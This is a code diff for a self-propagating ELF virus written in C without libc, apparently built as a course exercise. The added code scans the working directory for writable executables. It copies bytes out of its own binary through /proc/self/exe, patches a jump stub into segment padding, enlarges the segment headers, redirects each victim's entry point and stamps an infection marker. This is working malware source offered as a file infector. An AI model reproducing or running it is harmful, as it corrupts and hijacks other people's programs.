@@ -6,8 +6,7 @@
 
 #define RET_PATTERN 0xfffffffc
 
-//#define REQ_SIZE	0x9
-//#define PAY			("\x90\x90\x90\x90\xe9\xf7\xfc\xff\xff")
+#define REQ_SIZE	9 //0xb00
 
 #define DEBUG 	1
 
@@ -454,21 +453,21 @@ struct stat {
 
 intptr read(int fd, char *buf, uintptr nbytes);
 intptr write(int fd, void const* data, uintptr nbytes);
-intptr open3(const char *filename, intptr flags, intptr mode);
+//intptr open3(const char *filename, intptr flags, intptr mode);
 intptr open(const char *filename, intptr flags);
 intptr close(int fd);
 intptr getuid();
 intptr getrlimit(unsigned int resource, struct rlimit *rlim);
 intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+//intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 intptr getcwd(char *buf, unsigned long size);
 intptr stat(const char *filename, struct stat *statbuf);
 intptr fstat(unsigned int fd, struct stat *statbuf);
-intptr chmod(const char *filename, mode_t mode);
-intptr fchmod(unsigned int fd, mode_t mode);
+//intptr chmod(const char *filename, mode_t mode);
+//intptr fchmod(unsigned int fd, mode_t mode);
 intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off);
-intptr munmap(unsigned long addr, size_t len);
-intptr mprotect(unsigned long start, size_t len, unsigned long prot);
+//intptr munmap(unsigned long addr, size_t len);
+//intptr mprotect(unsigned long start, size_t len, unsigned long prot);
 intptr lseek(unsigned int fd, off_t offset, unsigned int origin);
 
 void* syscall6(
@@ -703,6 +702,7 @@ char* itoa(int num, char* str, int base);
 void* my_memset(void *b, int c, int len);
 void * my_memmove(void *dst, const void *src, size_t len);
 int infect(const char* fpath);
+//int my_main(int argc, char* argv[]);
 
 // syscall.c
 
@@ -728,16 +728,16 @@ intptr write(int fd, void const* data, uintptr nbytes)
 		);
 }
 
-intptr open3(const char *filename, intptr flags, intptr mode)
-{
-	return (intptr)
-		syscall3(
-			(void*)SYS_OPEN,
-			(void*)filename,
-			(void*)flags,
-			(void*)mode
-		);
-}
+// intptr open3(const char *filename, intptr flags, intptr mode)
+// {
+// 	return (intptr)
+// 		syscall3(
+// 			(void*)SYS_OPEN,
+// 			(void*)filename,
+// 			(void*)flags,
+// 			(void*)mode
+// 		);
+// }
 
 intptr open(const char *filename, intptr flags)
 {
@@ -787,16 +787,16 @@ intptr getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 		);
 }
 
-intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
-{
-	return (intptr)
-		syscall3(
-			(void*)SYS_GETDENTS64,
-			(void*)(unsigned long)fd,
-			(void*)dirp,
-			(void*)(unsigned long)count
-		);
-}
+// intptr getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+// {
+// 	return (intptr)
+// 		syscall3(
+// 			(void*)SYS_GETDENTS64,
+// 			(void*)(unsigned long)fd,
+// 			(void*)dirp,
+// 			(void*)(unsigned long)count
+// 		);
+// }
 
 intptr getcwd(char *buf, unsigned long size)
 {
@@ -826,23 +826,23 @@ intptr fstat(unsigned int fd, struct stat *statbuf) {
 		);
 }
 
-intptr chmod(const char *filename, mode_t mode) {
-	return (intptr)
-		syscall2(
-			(void*)SYS_CHMOD,
-			(void*)filename,
-			(void*)(unsigned long)mode
-		);
-}
+// intptr chmod(const char *filename, mode_t mode) {
+// 	return (intptr)
+// 		syscall2(
+// 			(void*)SYS_CHMOD,
+// 			(void*)filename,
+// 			(void*)(unsigned long)mode
+// 		);
+// }
 
-intptr fchmod(unsigned int fd, mode_t mode) {
-	return (intptr)
-		syscall2(
-			(void*)SYS_FCHMOD,
-			(void*)(unsigned long)fd,
-			(void*)(unsigned long)mode
-		);
-}
+// intptr fchmod(unsigned int fd, mode_t mode) {
+// 	return (intptr)
+// 		syscall2(
+// 			(void*)SYS_FCHMOD,
+// 			(void*)(unsigned long)fd,
+// 			(void*)(unsigned long)mode
+// 		);
+// }
 
 intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off) {
 	return (intptr)
@@ -857,24 +857,24 @@ intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned 
 		);
 }
 
-intptr munmap(unsigned long addr, size_t len) {
-	return (intptr)
-		syscall2(
-			(void*)SYS_MUNMAP,
-			(void*)addr,
-			(void*)(unsigned long)len
-		);
-}
+// intptr munmap(unsigned long addr, size_t len) {
+// 	return (intptr)
+// 		syscall2(
+// 			(void*)SYS_MUNMAP,
+// 			(void*)addr,
+// 			(void*)(unsigned long)len
+// 		);
+// }
 
-intptr mprotect(unsigned long start, size_t len, unsigned long prot) {
-	return (intptr)
-		syscall3(
-			(void*)SYS_MPROTECT,
-			(void*)start,
-			(void*)(unsigned long)len,
-			(void*)prot
-		);
-}
+// intptr mprotect(unsigned long start, size_t len, unsigned long prot) {
+// 	return (intptr)
+// 		syscall3(
+// 			(void*)SYS_MPROTECT,
+// 			(void*)start,
+// 			(void*)(unsigned long)len,
+// 			(void*)prot
+// 		);
+// }
 
 intptr lseek(unsigned int fd, off_t offset, unsigned int origin) {
 	return (intptr)
@@ -922,7 +922,6 @@ int getdtablesize()
 
 int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfds)
 {
-	//char * const paths[2] = { (char *)path, NULL };
 	int fd;
 	int nread;
 	char buf[32768];
@@ -947,19 +946,11 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfd
 		}
 		getcwd(cwd_buf,4096);
 		path_len = my_strlen(cwd_buf);
-		//write(1,cwd_buf,my_strlen(cwd_buf));
-		//write(1, "\n", 1);
-		//write(1, "--------------- dirent -----------\n",my_strlen("--------------- dirent -----------\n"));
-		//write(1, "file type   d_name\n", my_strlen("file type   d_name\n"));
+
 		for (bpos = 0; bpos < nread;) {
 			d = (struct linux_dirent *) (buf + bpos);
 			//write(1, "%8ld  ", d->d_ino);
 			if((d_type = *(buf + bpos + d->d_reclen - 1)) == DT_REG ) {
-				// if(DEBUG) {
-				// 	write(1, "[DEBUG] found reg file : ", my_strlen("[DEBUG] found reg file : "));
-				// 	write(1, d->d_name, my_strlen(d->d_name));
-				// 	write(1, "\n", 1);
-				// }
 				file_len = my_strlen(d->d_name);
 				char abs_path[path_len + file_len + 1 + 1];
 				my_memset(abs_path, '\0', path_len + file_len + 1 + 1);
@@ -1009,79 +1000,12 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfd
 
 int can_execute(const struct stat *sb, const char* fpath)
 {
-	//if(DEBUG) {
-		// write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
-		// write(1, fpath, my_strlen(fpath));
-		// if((sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
-		// 	|| (sb->st_mode & S_IXOTH)) {
-		// 	write(1, " executable", my_strlen(" executable"));
-		// } else {
-		// 	write(1, " non-executable", my_strlen(" non-executable"));
-		// }
-		// write(1, "\n", 1);
-	//}
 	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
 		|| (sb->st_mode & S_IXOTH);
 }
 
 int can_write(const struct stat *sb, const char* fpath)
 {
-	//if(DEBUG) {
-		// write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
-		// write(1, fpath, my_strlen(fpath));
-		// if((sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
-		// 	|| (sb->st_mode & S_IWOTH)) {
-		// 	write(1, " writable", my_strlen(" writable"));
-		// 	char tmp_stino[128];
-		// 	itoa(sb->st_ino, tmp_stino, 10);
-		// 	write(1, " st_ino(", my_strlen(" st_ino("));
-		// 	write(1, tmp_stino, my_strlen(tmp_stino));
-		// 	write(1, ")", 1);
-		// 	char tmp_stmode[128];
-		// 	itoa(sb->st_mode, tmp_stmode, 10);
-		// 	write(1, " st_mode(", my_strlen(" st_mode("));
-		// 	write(1, tmp_stmode, my_strlen(tmp_stmode));
-		// 	write(1, ")", 1);
-		// 	char tmp_stnlink[128];
-		// 	itoa(sb->st_nlink, tmp_stnlink, 10);
-		// 	write(1, " st_nlink(", my_strlen(" st_nlink("));
-		// 	write(1, tmp_stnlink, my_strlen(tmp_stnlink));
-		// 	write(1, ")", 1);
-		// 	char tmp_stuid[128];
-		// 	itoa(sb->st_uid, tmp_stuid, 10);
-		// 	write(1, " st_uid(", my_strlen(" st_uid("));
-		// 	write(1, tmp_stuid, my_strlen(tmp_stuid));
-		// 	write(1, ")", 1);
-		// 	char tmp_stgid[128];
-		// 	itoa(sb->st_gid, tmp_stgid, 10);
-		// 	write(1, " st_gid(", my_strlen(" st_gid("));
-		// 	write(1, tmp_stgid, my_strlen(tmp_stgid));
-		// 	write(1, ")", 1);
-		// 	char tmp_stblksize[128];
-		// 	itoa(sb->st_blksize, tmp_stblksize, 10);
-		// 	write(1, " st_blksize(", my_strlen(" st_blksize("));
-		// 	write(1, tmp_stblksize, my_strlen(tmp_stblksize));
-		// 	write(1, ")", 1);
-		// 	char tmp_stblocks[128];
-		// 	itoa(sb->st_blocks, tmp_stblocks, 10);
-		// 	write(1, " st_blocks(", my_strlen(" st_blocks("));
-		// 	write(1, tmp_stblocks, my_strlen(tmp_stblocks));
-		// 	write(1, ")", 1);
-		// 	char tmp_stsize[128];
-		// 	itoa(sb->st_size, tmp_stsize, 10);
-		// 	write(1, " st_size(", my_strlen(" st_size("));
-		// 	write(1, tmp_stsize, my_strlen(tmp_stsize));
-		// 	write(1, ")", 1);
-		// } else {
-		// 	write(1, " non-writable", my_strlen(" non-writable"));
-		// 	if(sb->st_uid != getuid() && (sb->st_mode & S_IWOTH)) {
-		// 		write(1, " as no W others", my_strlen(" as no W others"));
-		// 	} else if(sb->st_uid == getuid() && (sb->st_mode & S_IWUSR) == 0) {
-		// 		write(1, " as no W user", my_strlen(" as no W user"));
-		// 	}
-		// }
-		// write(1, "\n", 1);
-//	}
 	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
 		|| (sb->st_mode & S_IWOTH);
 }
@@ -1091,60 +1015,27 @@ int is_elf(const char* fpath)
 	Elf64_Ehdr header; // Assuming 64-bit ELF file.
 	size_t nb;
 	int ret = 0;
-	//FILE* f;
 	int f;
 
-	//f = fopen(fpath, "rb");
-	//f = open(fpath, O_RDONLY);
 	f = open(fpath, O_RDWR);
-	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
+
 	if (f < 0) {
-		// if(DEBUG) {
-		// 	write(1, "[DEBUG] error inspecting file : ", my_strlen("[DEBUG] error inspecting file : "));
-		// 	write(1, fpath, my_strlen(fpath));
-		// 	write(1, "\n", 1);
-		// }
 		return 0;
 	}
-	//nb = fread(&header, 1, sizeof(header), f);
 	nb = read(f, (char*)&header, sizeof(header));
 	if (nb == sizeof(header)) {
-		//if (my_memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
 		if ( header.e_ident[0] == (unsigned char)ELFMAG0 && header.e_ident[1] == (unsigned char)ELFMAG1 && header.e_ident[2] == (unsigned char)ELFMAG2 && header.e_ident[3] == (unsigned char)ELFMAG3 ){
 			ret = 1;
 		}
-	} //else {
-	// 	if(DEBUG) {
-	// 		write(1, "[DEBUG] error while reading file\n", my_strlen("[DEBUG] error while reading file\n"));
-	// 	}
-	// }
-	//fclose(f);
+	} 
 	close(f);
-
-	// if(DEBUG) {
-	// 	write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
-	// 	write(1, fpath, my_strlen(fpath));
-	// 	if(ret) {
-	// 		write(1, " is ELF", my_strlen(" is ELF"));
-	// 	} else {
-	// 		write(1, " is not ELF", my_strlen(" is not ELF"));
-	// 	}
-	// 	write(1, ", eident : ", my_strlen(", eident : "));
-	// 	char tmp_eident[128];
-	// 	itoa(header.e_ident, tmp_eident, 16);
-	// 	write(1, (char*)&(header.e_ident[1]), 3);
-	// 	write(1, &(header.e_ident[2]), 1);
-	// 	write(1, &(header.e_ident[3]), 1);
-	// 	write(1, "\n", 1);
-	// }
-
 
 	return ret;
 }
 
 int random_pick()
 {
-	int rand = 0;
+	char rand = 0;
 	int f;
 	char urand[13];
 	urand[0] = '/';
@@ -1161,17 +1052,11 @@ int random_pick()
 	urand[11] = 'm';
 	urand[12] = '\0';
 	f = open(urand, O_RDONLY);
-	read(f, (char*)&rand, 1);
+	read(f, &rand, 1);
 	close(f);
 	
-	// if(DEBUG) {
-	// 	write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
-	// 	char c = '0' + rand % 5;
-	// 	write(1, &c, 1);
-	// 	write(1, "\n", 1);
-	// }
 	//return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
-	return 1; // infecto 'em all
+	return 1; // nope, infecto 'em all
 }
 
 int file_process(const char *fpath,
@@ -1192,16 +1077,12 @@ int file_process(const char *fpath,
 
 int main(int argc, char* argv[])
 {
-	//struct timeval t;
 	char root_dir = '.';
 	int nfds = getdtablesize() - SPARE_FDS;
 	if(nfds == -5) return -1;
 	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
 
-	//gettimeofday(&t, NULL);
-	//srand(t.tv_usec * t.tv_sec);
 	nftw(&root_dir, file_process, nfds);
-	//write(1, "hello from libc-free world\n", 27);
 	return 0;
 }
 
@@ -1250,68 +1131,66 @@ my_strncpy(char *dest, const char *src, size_t n)
 
 // https://www.geeksforgeeks.org/implement-itoa/
 /* A utility function to reverse a string  */
-void reverse(char str[], int length)
-{
-    int start = 0;
-    int end = length -1;
-    while (start < end)
-    {
-        char tmp = *(str+start);
-        *(str+start) = *(str+end);
-        *(str+end) = tmp;
-        start++;
-        end--;
-    }
-}
+// void reverse(char str[], int length)
+// {
+//     int start = 0;
+//     int end = length -1;
+//     while (start < end)
+//     {
+//         char tmp = *(str+start);
+//         *(str+start) = *(str+end);
+//         *(str+end) = tmp;
+//         start++;
+//         end--;
+//     }
+// }
  
-// Implementation of itoa()
-char* itoa(int num, char* str, int base)
-{
-    int i = 0;
-    int isNegative = 0;
+// // Implementation of itoa()
+// char* itoa(int num, char* str, int base)
+// {
+//     int i = 0;
+//     int isNegative = 0;
  
-    /* Handle 0 explicitely, otherwise empty string is printed for 0 */
-    if (num == 0)
-    {
-        str[i++] = '0';
-        str[i] = '\0';
-        return str;
-    }
+//     /* Handle 0 explicitely, otherwise empty string is printed for 0 */
+//     if (num == 0)
+//     {
+//         str[i++] = '0';
+//         str[i] = '\0';
+//         return str;
+//     }
  
-    // In standard itoa(), negative numbers are handled only with 
-    // base 10. Otherwise numbers are considered unsigned.
-    if (num < 0 && base == 10)
-    {
-        isNegative = 1;
-        num = -num;
-    }
+//     // In standard itoa(), negative numbers are handled only with 
+//     // base 10. Otherwise numbers are considered unsigned.
+//     if (num < 0 && base == 10)
+//     {
+//         isNegative = 1;
+//         num = -num;
+//     }
  
-    // Process individual digits
-    while (num != 0)
-    {
-        int rem = num % base;
-        str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0';
-        num = num/base;
-    }
+//     // Process individual digits
+//     while (num != 0)
+//     {
+//         int rem = num % base;
+//         str[i++] = (rem > 9)? (rem-10) + 'a' : rem + '0';
+//         num = num/base;
+//     }
  
-    // If number is negative, append '-'
-    if (isNegative)
-        str[i++] = '-';
+//     // If number is negative, append '-'
+//     if (isNegative)
+//         str[i++] = '-';
  
-    str[i] = '\0'; // Append string terminator
+//     str[i] = '\0'; // Append string terminator
  
-    // Reverse the string
-    reverse(str, i);
+//     // Reverse the string
+//     reverse(str, i);
  
-    return str;
-}
+//     return str;
+// }
 
 // https://stackoverflow.com/questions/18851835/create-my-own-memset-function-in-c
 void  *my_memset(void *b, int c, int len)
 {
-	//int           i;
 	unsigned char *p = b;
-	//i = 0;
 	while(len > 0)
 	{
 		*p = c;
@@ -1325,10 +1204,6 @@ void  *my_memset(void *b, int c, int len)
 void * my_memmove(void *dst, const void *src, size_t len)
 {
 	size_t i;
-
-	// if ((uintptr)dst < (uintptr)src) {
-	// 	return memcpy(dst, src, len);
-	// }
 
 	// Copy by words in the common case. Look in memcpy.c for more
 	// information.
@@ -1357,12 +1232,42 @@ void * my_memmove(void *dst, const void *src, size_t len)
 	return dst;
 }
 
+// https://opensource.apple.com/source/Libc/Libc-825.26/string/FreeBSD/memmem.c
+void * my_memmem(const void *l, size_t l_len, const void *s, size_t s_len)
+{
+	register unsigned char *cur, *last;
+	const unsigned char *cl = (const unsigned char *)l;
+	const unsigned char *cs = (const unsigned char *)s;
+
+	/* we need something to compare */
+	if (l_len == 0 || s_len == 0)
+		return NULL;
+
+	/* "s" must be smaller or equal to "l" */
+	if (l_len < s_len)
+		return NULL;
+
+	/* special case where s_len == 1 */
+	//if (s_len == 1)
+		//return my_memcmp(l, (int)*cs, l_len);
+
+	/* the last position where its possible to find "s" in "l" */
+	//last = (char *)cl + l_len - s_len;
+	last = (unsigned char *)cl + l_len - s_len;
+
+	for (cur = (unsigned char *)cl; cur <= last; cur++)
+		if (cur[0] == cs[0] && my_memcmp(cur, cs, s_len) == 0)
+			return cur;
+
+	return NULL;
+}
+
 // FIXME: your infection logic should be placed here and below.
 int infect(const char* fpath)
 {
-	//printf("%s will be infected.\n", fpath);
-	write(1, fpath, my_strlen(fpath));
-	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
+	char pay[0x1000];
+	//write(1, fpath, my_strlen(fpath));
+	//write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
 
 	int victim_fd = open(fpath, O_RDWR);
 	if(victim_fd<0) {
@@ -1371,79 +1276,114 @@ int infect(const char* fpath)
 	struct stat victim_info;
 	fstat(victim_fd, &victim_info);
 
-	//int virus_fd = open()
-
 	void* victim = (void *)mmap(0, victim_info.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, victim_fd, 0);
 
-	Elf64_Ehdr* header = (Elf64_Ehdr*)victim;
+	Elf64_Ehdr* victim_header = (Elf64_Ehdr*)victim;
 
-	if(header->e_ident[EI_PAD + 2] == 0xAC && header->e_ident[EI_PAD + 3] == 0x3D && header->e_ident[EI_PAD + 4] == 0xC0 && header->e_ident[EI_PAD + 5] == 0xDE) {
+	if(victim_header->e_ident[EI_PAD + 2] == 0xAC && victim_header->e_ident[EI_PAD + 3] == 0x3D && victim_header->e_ident[EI_PAD + 4] == 0xC0 && victim_header->e_ident[EI_PAD + 5] == 0xDE) {
 		close(victim_fd);
 		return 0;
 	}
 
-	//Elf64_Addr ep = header->e_entry;
+	char self[32];
+	self[0] = '/';
+	self[1] = 'p';
+	self[2] = 'r';
+	self[3] = 'o';
+	self[4] = 'c';
+	self[5] = '/';
+	self[6] = 's';
+	self[7] = 'e';
+	self[8] = 'l';
+	self[9] = 'f';
+	self[10] = '/';
+	self[11] = 'e';
+	self[12] = 'x';
+	self[13] = 'e';
+	self[14] = '\0';
 
-	Elf64_Phdr* pHeader[header->e_phnum];
-	// Elf64_Shdr* sHeader[header->e_shnum];
-	// char* programs[header->e_phnum];
-	// char* sections[header->e_shnum];
-	// char* sNames[header->e_shnum];
+	int virus_fd = open(self, O_RDONLY);
+	if(virus_fd<0) {
+		//write(1, "error /proc/self/exe\n", my_strlen("error /proc/self/exe\n"));
+		close(victim_fd);
+		return -1;
+	}
+	//write(1, "open /proc/self/exe succeed\n", my_strlen("open /proc/self/exe succeed\n"));
+	struct stat virus_info;
+	fstat(virus_fd, &virus_info);
+	void* virus = (void *)mmap(0, virus_info.st_size, PROT_READ , MAP_SHARED, virus_fd, 0);
 
+	//Elf64_Ehdr* virus_header = (Elf64_Ehdr*)virus;
+
+	char sig[32];
+	// sig[0] = '\x90';
+	// sig[1] = '\x90';
+	// sig[2] = '\x90';
+	// sig[3] = '\x90';
+	// sig[4] = '\x48';
+	// sig[5] = '\x31';
+	// sig[6] = '\xec';
+	// sig[7] = '\x48';
+	// sig[8] = '\x31';
+	// sig[9] = '\xec';
+	// sig[10] = '\x90';
+	// sig[11] = '\x90';
+
+	sig[0] = '\x48';
+	sig[1] = '\x83';
+	sig[2] = '\xec';
+	sig[3] = '\x18';
+	sig[4] = '\x31';
+	sig[5] = '\xc0';
+	sig[6] = '\xc6';
+	sig[7] = '\x44';
+	sig[8] = '\x24';
+	sig[9] = '\x0f';
+	sig[10] = '\x2e';
+	sig[11] = '\xe8';
+
+	Elf64_Addr sig_pos = (Elf64_Addr)my_memmem(virus, virus_info.st_size, sig, 12);
+
+	if(sig_pos == NULL) {
+		//write(1, "error memmem\n", my_strlen("error memmem\n"));
+		close(victim_fd);
+		close(virus_fd);
+		return -1;
+	}
+
+	// if(DEBUG) {
+	// 	char tmp_memmem[32];
+	// 	itoa(sig_pos & 0x7fffffff, tmp_memmem, 16);
+	// 	write(1, "memmem : ", my_strlen("memmem : "));
+	// 	write(1, tmp_memmem, my_strlen(tmp_memmem));
+	// 	char newline = '\n';
+	// 	write(1, &newline, 1);
+	// }
+
+	// I don't know why but main comes before start asm..
+	// thus start from main, located at -(0x129 - 0xe8) in one sample
+	// changing function main to my_main solved it
+	my_memmove(pay, (void *)sig_pos, REQ_SIZE);
+
+
+
+	Elf64_Phdr* pHeader[victim_header->e_phnum];
 	Elf64_Half textseg = 0;
 
-	char* pos = victim + header->e_phoff;
-	for(int i = 0 ; i < header->e_phnum ; i++) {
+	char* pos = victim + victim_header->e_phoff;
+	for(int i = 0 ; i < victim_header->e_phnum ; i++) {
 		pHeader[i] = (Elf64_Phdr*)pos;
 		if(pHeader[i]->p_type == PT_LOAD && pHeader[i]->p_flags & (PF_R | PF_X)) {
 			textseg = (Elf64_Half)i;
 		}
-		pos += header->e_phentsize;
+		pos += victim_header->e_phentsize;
 	}
 
-	// pos = victim + header->e_shoff;
-	// for(int i = 0 ; i < header->e_shnum ; i++) {
-	// 	sHeader[i] = (Elf64_Shdr*)pos;
-	// 	pos += header->e_shentsize;
-	// }
-
-	// for(int i = 0 ; i < header->e_phnum ; i++) {
-	// 	programs[i] = (char *)(victim + pHeader[i]->p_offset);
-	// }
-
-	// for(int i = 0 ; i < header->e_shnum ; i++) {
-	// 	sections[i] = (char *)(victim + sHeader[i]->sh_offset);
-	// }
-
-	//Elf64_Half shstrndx = header->e_shstrndx;
-	//Elf64_Half textsec;
-
-	// char text[6];
-	// text[0] = '.';
-	// text[1] = 't';
-	// text[2] = 'e';
-	// text[3] = 'x';
-	// text[4] = 't';
-	// text[5] = '\0';
-	// if(shstrndx != SHN_UNDEF) {
-	// 	//int pos = 1;
-	// 	for(int i = 0 ; i < header->e_shnum ; i++) {
-	// 		if(my_memcmp(sections[shstrndx] + sHeader[i]->sh_name, &text, 5) == 0) {
-	// 			textsec = (Elf64_Half)i;
-	// 		}
-	// 	}
-	// } else {
-
-	// 	close(victim_fd);
-	// 	return -1;
-	// }
-
 	Elf64_Off padding;
-	//Elf64_Xword padsize;
 
 	padding = pHeader[textseg - 1]->p_offset + pHeader[textseg - 1]->p_filesz;
 	
-	int offset = padding + 9 - header->e_entry;
+	int offset = padding + REQ_SIZE - victim_header->e_entry;
 	char tmp_offset[32];
 	tmp_offset[0] = '\x90';
 	tmp_offset[1] = '\x90';
@@ -1460,50 +1400,32 @@ int infect(const char* fpath)
 		
 	} else {
 		offset = 0x0fffffff - offset + 1;
-		for(int i = 0 ; i < 4 ; i++) {
+		for(int i = 0 ; i < 3 ; i++) {
 			tmp_offset[5+i] = (char)(offset & 0x000000ff);
 			offset = offset >> 8;
 		}
 		tmp_offset[8] = '\xff';
 	}
 
-	if( my_strlen(tmp_offset) > pHeader[textseg]->p_offset - padding) {
+	if( REQ_SIZE > pHeader[textseg]->p_offset - padding) {
 		close(victim_fd);
+		close(virus_fd);
 		return -1;
 	}
 
-	// if(DEBUG) {
-	// 	write(1, "text : seg[", my_strlen("text : seg["));
-	// 	char tmp_index[8];
-	// 	itoa(textseg, tmp_index, 10);
-	// 	write(1, tmp_index, my_strlen(tmp_index));
-	// 	write(1, "]\n", 2);
-	// 	write(1,"found padding : ", my_strlen("found padding : "));
-	// 	char tmp_padding[128];
-	// 	itoa(padding, tmp_padding, 16);
-	// 	write(1, tmp_padding, my_strlen(tmp_padding));
-	// 	write(1, "\n", 1);
-	// 	write(1,"jmp offset : ", my_strlen("jmp offset : "));
-		//unsigned int offset = padding + REQ_SIZE - header->e_entry;
-		//offset = 0x0fffffff - offset + 1;
-		//char tmp_offset[32];
-		//itoa(offset, tmp_offset, 16);
-	// 	write(1, tmp_offset, my_strlen(tmp_offset));
-	// 	write(1, "\n", 1);
-	// }
+	my_memmove(victim + padding, tmp_offset, REQ_SIZE);
 
-	my_memmove(victim + padding, tmp_offset, my_strlen(tmp_offset));
+	pHeader[textseg - 1]->p_filesz += REQ_SIZE;
+	pHeader[textseg - 1]->p_memsz += REQ_SIZE;
+	victim_header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding);
 
-	pHeader[textseg - 1]->p_filesz += my_strlen(tmp_offset);
-	pHeader[textseg - 1]->p_memsz += my_strlen(tmp_offset);
-	header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding);
-
-	header->e_ident[EI_PAD + 2] = 0xAC;
-	header->e_ident[EI_PAD + 3] = 0x3D;
-	header->e_ident[EI_PAD + 4] = 0xC0;
-	header->e_ident[EI_PAD + 5] = 0xDE;
+	victim_header->e_ident[EI_PAD + 2] = 0xAC;
+	victim_header->e_ident[EI_PAD + 3] = 0x3D;
+	victim_header->e_ident[EI_PAD + 4] = 0xC0;
+	victim_header->e_ident[EI_PAD + 5] = 0xDE;
 
 	close(victim_fd);
+	close(virus_fd);
 	
 	return 0;
 }
